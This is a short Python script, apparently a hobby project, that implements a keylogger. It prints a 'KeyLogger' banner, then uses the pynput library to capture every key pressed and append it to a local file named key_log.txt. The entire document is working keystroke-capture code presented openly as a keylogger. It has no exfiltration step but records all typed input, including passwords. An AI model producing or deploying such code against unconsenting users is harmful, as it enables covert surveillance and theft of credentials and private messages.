from pynput import keyboard
from pyfiglet import Figlet

class Keylogger:


    def keylogger(self):
        
        f = Figlet(font='slant')
        print(f.renderText('KeyLogger'))
        def on_press(key):
            try:
                with open("key_log.txt", "a") as log:
                    log.write(f'\n{key.char}')
            except AttributeError:
                with open("key_log.txt", "a") as log:
                    log.write(f'[{key}]')

        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()


obj=Keylogger()
obj.keylogger()


